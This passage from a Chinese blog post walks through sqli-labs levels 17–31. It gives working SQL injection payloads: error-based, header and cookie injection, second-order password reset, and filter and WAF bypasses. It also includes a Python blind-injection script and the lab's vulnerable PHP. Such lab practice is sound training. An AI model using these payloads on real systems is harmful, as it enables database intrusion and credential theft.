+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password:1&apos; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;user&apos;),0x7e),1)#</span><br></pre></td></tr></table></figure>
+
+<p>17-5</p>
+<p>爆详细数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password:1&apos; and updatexml(1,concat(0x7e,(select username from users),0x7e),1)#</span><br></pre></td></tr></table></figure>
+
+<p>17-6</p>
+<p>产生报错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You can&apos;t specify target table &apos;users&apos; for update in FROM clause</span><br></pre></td></tr></table></figure>
+
+<p> 这是mysql自身的问题不能同时对一个表又select又update，所以我们得构造另外一个表去子查询，同时得初始化数据库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password:1&apos; and updatexml(1,concat(0x7e,(select username from (select username  from users)b limit 0,1),0x7e),1)#</span><br></pre></td></tr></table></figure>
+
+<p>17-7</p>
+<p><strong>2020-1-16</strong></p>
+<h4 id="Level-18-基于错误的用户代理，头部POST注入"><a href="#Level-18-基于错误的用户代理，头部POST注入" class="headerlink" title="Level 18-基于错误的用户代理，头部POST注入"></a>Level 18-基于错误的用户代理，头部POST注入</h4><p>18-1</p>
+<p>页面显示<code>Your IP ADRESS is:172.17.0.1</code>又根据标题可推测为http头部注入</p>
+<p>查看后端源代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;</span><br><span class="line">	$result1 = mysql_query($sql);</span><br><span class="line">	$row1 = mysql_fetch_array($result1);</span><br><span class="line">		if($row1)</span><br><span class="line">			&#123;</span><br><span class="line">			echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&apos;;</span><br><span class="line">			$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&apos;$uagent&apos;, &apos;$IP&apos;, $uname)&quot;;</span><br><span class="line">			mysql_query($insert);</span><br></pre></td></tr></table></figure>
+
+<p>要登录进去后才能注入，利用的是insert的那一部分语句，使用以下用户名和密码登陆</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:admin</span><br><span class="line">password:admin</span><br></pre></td></tr></table></figure>
+
+<p>18-2</p>
+<p>接着利用user-agent注入</p>
+<p>先输入<code>1&#39;</code>，会报错<code>MySQL server version for the right syntax to use near &#39;127.0.0.1&#39;, &#39;admin&#39;)&#39;</code> </p>
+<p>再输入 <code>1&#39; and &#39;1&#39;=&#39;1</code> </p>
+<p>出现回显并且没有报错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your User Agent is: 1&apos; and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
+
+<p>直接利用报错注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
+
+<p>18-3</p>
+<p>之后就一步一步利用上一关的payload进行爆表-爆列-包数据的操作</p>
+<h4 id="Level-19-基于头部的Referer-POST报错注入"><a href="#Level-19-基于头部的Referer-POST报错注入" class="headerlink" title="Level-19-基于头部的Referer POST报错注入"></a>Level-19-基于头部的Referer POST报错注入</h4><p>从<strong>Level-18</strong>开始，每一题都需要登陆成功才能完成注入</p>
+<p>这里回显在Referer上，所以和上一题差不多，直接将payload放在Refer里报错注入就行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: 1&apos; and updatexml(1,concat(0x7e,(database()),0x7e),1) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
+
+<h4 id="Level-20-基于错误的cookie头部POST注入"><a href="#Level-20-基于错误的cookie头部POST注入" class="headerlink" title="Level-20-基于错误的cookie头部POST注入"></a>Level-20-基于错误的cookie头部POST注入</h4><p>此题回显在cookie上，</p>
+<p>先尝试一下cookie</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos;;</span><br></pre></td></tr></table></figure>
+
+<p>出现报错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;admin&apos;&apos; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
+
+<p>应该是单引号闭合，接下来通过cookie进行报错注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos; and updatexml(1,concat(0x7e,database(),0x7e),1) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
+
+<p><strong>2020-1-17</strong></p>
+<h4 id="Less-21-基于错误的复杂的字符型Cookie注入"><a href="#Less-21-基于错误的复杂的字符型Cookie注入" class="headerlink" title="Less-21-基于错误的复杂的字符型Cookie注入"></a>Less-21-基于错误的复杂的字符型Cookie注入</h4><p>此关卡通过查看后端源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setcookie(<span class="string">'uname'</span>, base64_encode($row1[<span class="string">'username'</span>]), time()+<span class="number">3600</span>);</span><br></pre></td></tr></table></figure>
+
+<p>发现<code>username</code>这个参数注入的时候经过了base64加密，所以我们注入的payload也得经过base64加密后再输入</p>
+<p>先登陆进去，登陆成功页面如下</p>
+<p>21-1</p>
+<p>burp抓包，修改参数（base64加密）进行注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos; and updatexml(1,concat(0x7e,database(),0x7e),1) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
+
+<p>即payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=YWRtaW4nIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxkYXRhYmFzZSgpLDB4N2UpLDEpIG9yICcxJz0nMQ==</span><br></pre></td></tr></table></figure>
+
+<p>21-2</p>
+<h4 id="Less-22-基于错误的双引号字符型Cookie注入"><a href="#Less-22-基于错误的双引号字符型Cookie注入" class="headerlink" title="Less-22-基于错误的双引号字符型Cookie注入"></a>Less-22-基于错误的双引号字符型Cookie注入</h4><p>同<strong>Less-21</strong>，只是闭合方式由单引号变成双引号</p>
+<p>payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot; and updatexml(1,concat(0x7e,database(),0x7e),1) or &quot;1&quot;=&quot;1</span><br><span class="line">uname=YWRtaW4iIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxkYXRhYmFzZSgpLDB4N2UpLDEpIG9yICIxIj0iMQ==</span><br></pre></td></tr></table></figure>
+
+<h4 id="Less-23-基于错误的，过滤注释的GET型"><a href="#Less-23-基于错误的，过滤注释的GET型" class="headerlink" title="Less-23-基于错误的，过滤注释的GET型"></a>Less-23-基于错误的，过滤注释的GET型</h4><p>又回到使用<code>id</code>来注入了，这里对注释符进行了过滤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$reg = <span class="string">"/#/"</span>;</span><br><span class="line">$reg1 = <span class="string">"/--/"</span>;</span><br><span class="line">$replace = <span class="string">""</span>;</span><br><span class="line">$id = preg_replace($reg, $replace, $id);</span><br><span class="line">$id = preg_replace($reg1, $replace, $id);</span><br></pre></td></tr></table></figure>
+
+<p>这里有两种绕过方法</p>
+<ul>
+<li>使用union注入（ 要构造sql语句闭合前后的单引号 ）</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,(select group_concat(username) from users),(select group_concat(password) from users)&apos;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用报错注入</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
+
+<h4 id="Less-24-二次注入"><a href="#Less-24-二次注入" class="headerlink" title="Less-24-二次注入"></a>Less-24-二次注入</h4><p>24-1</p>
+<p>根据名字可知这是个二次注入的题目，二次注入的题一般都要通过代码审计找出可控点，否则很难注入</p>
+<p>通过代码审计，发现最关键的是pass_change.php里面的代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' "</span></span><br></pre></td></tr></table></figure>
+
+<p>我们可以注册以下用户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=admin’#</span><br><span class="line">password=123</span><br></pre></td></tr></table></figure>
+
+<p>24-2</p>
+<p>登陆，修改密码</p>
+<p>24-3</p>
+<p>再登陆就可以修改用户admin的密码</p>
+<p>24-4</p>
+<h4 id="Less-25-过滤了or和and"><a href="#Less-25-过滤了or和and" class="headerlink" title="Less-25-过滤了or和and"></a>Less-25-过滤了or和and</h4><p>25-1</p>
+<p>题目已经告诉是过滤了or和and</p>
+<p>再看看后端源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/AND/i'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> or还有AND都会替换成为<code>&quot;&quot;</code>，这里是大小写都会被拦截下来的 </p>
+<p>这里的绕过方法还挺多的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">大小写变形Or,OR,oR</span><br><span class="line">编码，hex，urlencode</span><br><span class="line">添加注释/*or*/</span><br><span class="line">利用符号and=&amp;&amp; or=||</span><br><span class="line">双写绕过</span><br></pre></td></tr></table></figure>
+
+<p>payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; aandnd updatexml(1,concat(0x7e,database(),0x7e),1) %23</span><br></pre></td></tr></table></figure>
+
+<h4 id="Less-25a-过滤了or和and的盲注"><a href="#Less-25a-过滤了or和and的盲注" class="headerlink" title="Less-25a-过滤了or和and的盲注"></a>Less-25a-过滤了or和and的盲注</h4><p>跟上一关卡采用同样的过滤方式，语句变简单了，没有闭合<br>但是这一关卡不能再用报错注入，因为源码中把报错信息给注释掉了，可以用盲注，也可以用union注入</p>
+<ul>
+<li>union注入</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,database(),3%23</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>二分法盲注</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://127.0.0.1/Less-25a/?id=1 aandnd ascii(substr(database(),&#123;_&#125;,1))&gt;&#123;__&#125;%23'''</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    Min = <span class="number">67</span></span><br><span class="line">    Max =<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> abs(Max-Min)&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (Max+Min)//<span class="number">2</span></span><br><span class="line">        payload = url.format(_=i,__=mid)</span><br><span class="line">        ans = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Your Login name:Dumb'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">            Min = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Max = mid</span><br><span class="line">    database += chr(Max)</span><br><span class="line">    <span class="keyword">print</span> database</span><br></pre></td></tr></table></figure>
+
+<p><font color="red"> 注意 ：这两关在写到关于information这个单词的时候，需要注意它里面存在or，我们需要双写绕过</font></p>
+<p><strong>2020-1-18</strong></p>
+<h4 id="Less-26-过滤了注释和空格的注入"><a href="#Less-26-过滤了注释和空格的注入" class="headerlink" title="Less-26-过滤了注释和空格的注入"></a>Less-26-过滤了注释和空格的注入</h4><p>后端源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/and/i'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//strip out /*</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out --</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);			<span class="comment">//Strip out #</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[\s]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out spaces</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[\/\\\\]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out slashes</span></span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>注释被过滤了，考虑使用闭合单引号注入</p>
+</li>
+<li><p>空格使用<code>%0a</code>来绕过</p>
+</li>
+<li><p>or和and依旧双写绕过</p>
+</li>
+</ul>
+<p>payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos;%a0union%a0select%a01,(select%a0group_concat(passwoorrd)%a0from%a0users),&apos;3</span><br></pre></td></tr></table></figure>
+
+<h4 id="Less-26a-过滤了注释和空格的盲注"><a href="#Less-26a-过滤了注释和空格的盲注" class="headerlink" title="Less-26a-过滤了注释和空格的盲注"></a>Less-26a-过滤了注释和空格的盲注</h4><p>跟上一题一样，只是换了一种闭合方式 <code>(&#39;$id&#39;)</code> </p>
+<p>payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos;)%a0union%a0select%a01,(select%a0group_concat(passwoorrd)%a0from%a0users),(&apos;3</span><br></pre></td></tr></table></figure>
+
+<h4 id="Less-27-过滤了union和select"><a href="#Less-27-过滤了union和select" class="headerlink" title="Less-27-过滤了union和select"></a>Less-27-过滤了union和select</h4><p>后端源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//strip out /*</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out --.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);			<span class="comment">//Strip out #.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/select/m'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/union/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out union</span></span><br><span class="line">$id= preg_replace(<span class="string">'/select/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out select</span></span><br><span class="line">$id= preg_replace(<span class="string">'/UNION/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out UNION</span></span><br><span class="line">$id= preg_replace(<span class="string">'/SELECT/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out SELECT</span></span><br><span class="line">$id= preg_replace(<span class="string">'/Union/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out Union</span></span><br><span class="line">$id= preg_replace(<span class="string">'/Select/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这时一些sql查询命令被过滤，可以使用双写绕过或者大小写绕过</p>
+<ul>
+<li>直接查询</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos;%a0uNIon%a0seLEct%a01,(seLEct%a0group_concat(password)%a0from%a0users),&apos;3</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>报错查询</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos;and%a0updatexml(1,concat(0x7e,database(),0x7e),1)%a0and&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
+
+<h4 id="Less-27a-过滤了union和select的盲注"><a href="#Less-27a-过滤了union和select的盲注" class="headerlink" title="Less-27a-过滤了union和select的盲注"></a>Less-27a-过滤了union和select的盲注</h4><p>换成了双引号闭合，其余和上一关一样</p>
+<p>payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&quot;%a0uNIon%a0seLEct%a01,(seLEct%a0group_concat(password)%a0from%a0users),&quot;3</span><br></pre></td></tr></table></figure>
+
+<p>或</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&quot;and%a0updatexml(1,concat(0x7e,database(),0x7e),1)%a0and&quot;1&quot;=&quot;1</span><br></pre></td></tr></table></figure>
+
+<h4 id="Less-28-基于错误的，-有括号的单引号字符型，过滤了union和select等的注入"><a href="#Less-28-基于错误的，-有括号的单引号字符型，过滤了union和select等的注入" class="headerlink" title="Less-28-基于错误的， 有括号的单引号字符型，过滤了union和select等的注入"></a>Less-28-基于错误的， 有括号的单引号字符型，过滤了union和select等的注入</h4><p>和<strong>Level-27</strong>相比，闭合方式改为 <code>(&#39;$id&#39;)</code> ，但此时不能使用报错注入</p>
+<p>payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos;)%a0uNIon%a0seLEct%a01,(seLEct%a0group_concat(password)%a0from%a0users),(&apos;3</span><br></pre></td></tr></table></figure>
+
+<h4 id="Less-28a-有括号的单引号字符型，过滤了union和select等的盲注"><a href="#Less-28a-有括号的单引号字符型，过滤了union和select等的盲注" class="headerlink" title="Less-28a-有括号的单引号字符型，过滤了union和select等的盲注"></a>Less-28a-有括号的单引号字符型，过滤了union和select等的盲注</h4><p>和上一关一样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos;)%a0uNIon%a0seLEct%a01,(seLEct%a0group_concat(password)%a0from%a0users),(&apos;3</span><br></pre></td></tr></table></figure>
+
+<h4 id="Less-29-WAF保护"><a href="#Less-29-WAF保护" class="headerlink" title="Less-29-WAF保护"></a>Less-29-WAF保护</h4><p><strong>Less-29</strong>-<strong>Less-31</strong>都是两层服务器架构，参考<a href="https://www.cnblogs.com/lcamry/p/5762961.html" target="_blank" rel="noopener">MySQL注入天书</a> </p>
+<p>重点：index.php?id=1&amp;id=2，到底是显示id=1的数据还是显示id=2的？</p>
+<p>Explain：apache（php）解析最后一个参数，即显示id=2的内容。Tomcat（jsp）解析第一个参数，即显示id=1的内容。</p>
+<p>再查看后端源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$qs = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line">	$hint=$qs;</span><br><span class="line">	$id1=java_implimentation($qs);</span><br><span class="line">	$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">	<span class="comment">//echo $id1;</span></span><br><span class="line">	whitelist($id1);</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
+
+<p><code>id</code>的值经过<code>java_implimentation()</code>处理看是否符合<code>whitelist()</code>函数的过滤要求，若不符合就检测出攻击，否则就把第二个<code>id</code>的值拼接到sql语句中进行查询。</p>
+<ul>
+<li><code>whitelist()</code>要求传入的参数必须是一位以上的数字</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">whitelist</span><span class="params">($input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$match = preg_match(<span class="string">"/^\d+$/"</span>, $input);</span><br><span class="line">	<span class="keyword">if</span>($match)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//echo "you are good";</span></span><br><span class="line">		<span class="comment">//return $match;</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;	</span><br><span class="line">		header(<span class="string">'Location: hacked.php'</span>);</span><br><span class="line">		<span class="comment">//echo "you are bad";</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>java_implimentation()</code>则将传入的参数以<code>&amp;</code>为分隔符分为两部分，然后进行遍历，若前两个字符为<code>id</code>则返回后面3到30个字符。</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">java_implimentation</span><span class="params">($query_string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$q_s = $query_string;</span><br><span class="line">	$qs_array= explode(<span class="string">"&amp;"</span>,$q_s);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">foreach</span>($qs_array <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">	&#123;</span><br><span class="line">		$val=substr($value,<span class="number">0</span>,<span class="number">2</span>);</span><br><span class="line">		<span class="keyword">if</span>($val==<span class="string">"id"</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			$id_value=substr($value,<span class="number">3</span>,<span class="number">30</span>); </span><br><span class="line">			<span class="keyword">return</span> $id_value;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=-1&apos; union select 1,database(),3 %23</span><br></pre></td></tr></table></figure>
+
+<h4 id="Less-30-WAF保护"><a href="#Less-30-WAF保护" class="headerlink" title="Less-30-WAF保护"></a>Less-30-WAF保护</h4><p>同上，只是改变了闭合的方式</p>
+<p>此题闭合方式为双引号闭合</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=-1&quot; union select 1,database(),3 %23</span><br></pre></td></tr></table></figure>
+
+<h4 id="Less-31-WAF保护"><a href="#Less-31-WAF保护" class="headerlink" title="Less-31-WAF保护"></a>Less-31-WAF保护</h4><p>同上，只是改变了闭合的方式</p>
+<p>此题闭合方式为 <code>(&quot;$id&quot;)</code> </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=-1&quot;) union select 1,database(),3 %23</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+                <a href="/2020/01/05/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%8D%E4%B9%A0%E8%B5%84%E6%96%99/" rel="next" title="网络安全复习资料">
+                  <i class="fa fa-chevron-left"></i> 网络安全复习资料
+                </a>
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+                <a href="/2020/01/13/%E5%90%84%E7%A7%8D%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%8F%8A%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/" rel="prev" title="各种开发环境及工具安装教程">
+                  各种开发环境及工具安装教程 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
